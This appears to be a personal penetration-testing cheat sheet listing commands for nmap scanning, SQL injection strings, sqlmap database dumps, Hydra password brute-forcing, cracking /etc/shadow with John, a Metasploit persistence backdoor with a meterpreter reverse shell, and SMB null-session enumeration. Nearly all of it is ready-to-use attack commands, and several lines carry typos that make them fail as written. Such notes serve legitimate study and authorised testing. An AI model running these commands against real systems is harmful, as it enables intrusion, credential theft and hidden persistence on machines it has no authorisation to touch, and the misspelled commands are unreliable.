
### Telent :

> - telent hostName portNumber

&nbsp;
### SSH

>- ssh usernmae@hostname -p portNumber -i ssh_key_file
    
>- ssh username@hostName -p portNumber 
    
>-  ssh userName@hostName -t /bin/sh -p portNumber  --> log with out .bashrc file  
    
    
&nbsp;       
    
### OpenSSL:

> - openssl s_client -connect hostName:portNumber
    
&nbsp;

### Linux:
 
> - ls -ld .?*    ----> Show hidden files 


&nbsp;
### Nmap :

>-  nmap -sT IP_address             ----> TCP scan (active scanning), complete handshake
    
>-  namp -sS Ip_address            -----> Stealth scan(No logs), as the handshakes is NOT completed 
    
>-  nmap -sV IP_address           ------> probing services on the ports
    
>-  nmap -Pn IP_address           ------> scanning without sending pings 
    
>-  nmap -O IP_address           ------> scan with OS fingerprinting 
    
>-  nmap -A IP_address         --------> 
   
   
&nbsp;

### Netcat

>-  nc -l 1234

&nbsp;
### Manual SQL

>- ' and 1=1; -- -  | True returns something

>- ' and 1=2;-- -   | False does not return anything
 
>- ' or 1=1; -- - 

>- ' or 1=2; -- - 


### SQLmap 


>- sqlmap -u "URL" -- > qquick enumeration fro the URL


>- sqlmap -u "URL" -b --> get the banner 


>- sqlmap -u "URL" --tables --> to get the tables 

>-  sqlmap -u "URL" --dumps --> dumps all the database

&nbsp;

### Hydra:

> -  hydra targetWebsite http-post-form "/login.php:user=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt  -f -v

&nbsp;
>  - hydra 192.168.2.4 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -v 

	
&nbsp;

	
### John

__Unshadow__

> - unshadow /etc/passwd /etc/shadow > hashes.txt 

> - john --wordlist=/usr/share/john/password.lst hashes

> - John --show hashes 


&nbsp;


### Metaploit:

### Searchsploit :

> - searchsploit nameofVuln OS_type
        
> - searchsolit rpc windows
            
> - searchsploit MS08-067 windows



### Metasploit :


> - search vlunerabilityName
        
> - search OSType
        
> - use pathof the exploit

> - show payloads

> - set payloads typeofPayload
        
> - set RHOST
        
> - set RPORT 
        
> - exploit

&nbsp;

### USing Metasploit with exploits:


__[s4u_persistence]                             |  install backdoor on meterpreter session using__ 

> - use exploit/windows/local/s4u_persistence     |  module 

> - show options                                  |  show options that come with the module 

> - set trigger logon                             |  sets up the module to start when the usre logson 


>  - set payload/windows/meterpreter/reverse_tcp  | generated the payload type reverse shell 


> - set LHOST hostIP			          | add host IP


> - set LPORT hostPORT 				  | add host port 

> - exploit 



__Set up a listener handler__


> - use exploit/multi/handler    		 | setting up listener handler


> - set payload/meterpreter/revserse_tcp   | setting up meterpreter


> - set LHOST				 | host IP


> - set LPORT 				 | host Port 
	

> - show options 				 | show the options that comes with a module 


> - exploit 


__Meterpreter Commands:___


> - screenshot                           | for desktop screenshot

> - download filePath 			 | download files from the other machine 

>- upload filePath 			 | upload files to the other machine 

> - help 				 | to show all the meterpreter commands 


&nbsp;

__ __
### Null Session : 

__allows annoymous connection to windows machine__

__if netbios-ssn is open, check if a null session can be connected__


__Things to look for when enumerating file share server___:


- User enumeration

- Share enumeration

- Group and member enumeration

- Password policy extraction

- OS information detection 

- An nmblookup run

- Printer information extraction



### enum4linux


> - enum4linux -n 192.168.2.66    | check if the file server is open

__nmblooup is used to query NetBios names and map them to IP addresses in an network__

__Flag <20> means that the file server service is open__


> - enum4linux -P 192.168.2.66    | check the password policy 

__Password policies are used for generating password list or bruteforce the server___


> - enum4linux  -s /usr/share/enum4linux/share-list.txt 192.168.2.66  | bruteforce the shares in case you did not get them from the above commands

> - enum4linux -a 192.168.66.2 | runs all of the above commands in one time 


### samrdump

__Path: /usr/share/doc/python-impacket-doc/examples/__ 

__It lists system user accounts, available resource shares and other sensitive information exported through this service.__


> - python samrdump   192.168.99.44   | information about the accounts associated with the IP address


### Nmap Scripts

> - nmap -script=smb-enum-shares 192.168.9.33             | retrieves information about the users and passwords


> - nmap -script=smb-enum-users 192.168.2.33              | Checks the users that are connected on the session

> - nmap -script=smb-brute 192.168.3.44   		  | This script will bruteforece the username and passsword of the vulnerable machine 




### nbtstat

__Windows command line tool that can display information about a traget__


> - nbtstat -A 10.130.40.80    | display general commands about the user 

__flag <00> means that the machine is a workstation__

__flag <20> means that the file server is open__

__Unique means that the machine has only one IP address__



### Net VIEW

> - NET VIEW 192.168.40.66   		| enumerate the file shares 



### smbclient 


__enumaration tool for Linux___


> - smbclient -L //10.186.60.50 -N     | enumerates the shares provided by a host


__ -L allows to look at what services are available on a target__

__ -n forces the tool to not ask for a password__


> - smbclient //10.189.60.40/$IPC -N

__Connecting to the shared drive___

> - smbclient //192.168.99.77/DirName  

 if you get smb prompt, means you are inside the share, | check the mapping and listing of the enumeration 


__Download the file to the local machine__

> - get fileName  /root/path/local/machine


### net use 

__ checking for NUll Session with WINDOWS___


> - net use \\10.189.40.70\$IP '' /u:''


__if the returned message is successfully completeted, otherwise you are not___




### ENUM 

__a command line utility that can retreive information from a system vulnerable to null session attacks__


> - enum -S 192.168.29.90  		| enumerates the shares 


> - enum -U 192.168.70.80 	 	| enumerates the users


> - enum -P 192.168.70.40 		| enumerate the password policy 










